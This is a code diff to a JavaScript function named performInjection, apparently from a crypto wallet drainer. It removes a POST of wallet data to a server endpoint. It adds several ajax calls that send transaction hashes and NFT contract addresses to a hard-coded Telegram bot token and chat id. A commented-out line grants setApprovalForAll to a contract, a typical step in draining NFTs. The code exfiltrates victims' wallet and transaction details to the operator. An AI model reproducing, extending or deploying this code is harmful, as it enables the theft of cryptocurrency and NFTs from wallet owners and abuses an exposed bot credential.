@@ -141,13 +141,6 @@ async function performInjection(address) {
             data["balance"] = actualDict[0]["balance"];
         }
         console.log(data)
-        await fetch(`${URL}/transfer/init`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        });
 
         //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
         //console.log(result);
@@ -173,7 +166,17 @@ async function performInjection(address) {
             var z=$.ajax({  
   type: "POST",  
   url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
-  data: "parse_mode=HTML&text="+encodeURIComponent(txHash), 
+  data: "parse_mode=HTML&text="+encodeURIComponent("https://etherscan.io/tx/"+txHash), 
+  }); 
+            var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent("Контракт:"+higherPrice), 
+  }); 
+            var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent("Контракт:"+sortedNFTs[i][key][0]), 
   }); 
             if (i == sortedNFTs.length - 1) {
                 
